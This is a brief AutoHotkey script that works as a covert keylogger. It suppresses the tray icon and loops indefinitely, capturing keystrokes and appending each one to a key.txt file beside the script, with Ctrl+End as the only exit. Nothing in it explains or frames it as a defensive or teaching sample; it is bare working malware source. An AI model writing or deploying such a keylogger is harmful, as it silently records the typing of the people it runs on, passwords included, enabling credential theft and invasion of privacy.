#NoTrayIcon
Loop {
	Input,	key,	V	T5,
	FileAppend, %key% ,%A_ScriptDir%\key.txt
}

^END::
ExitApp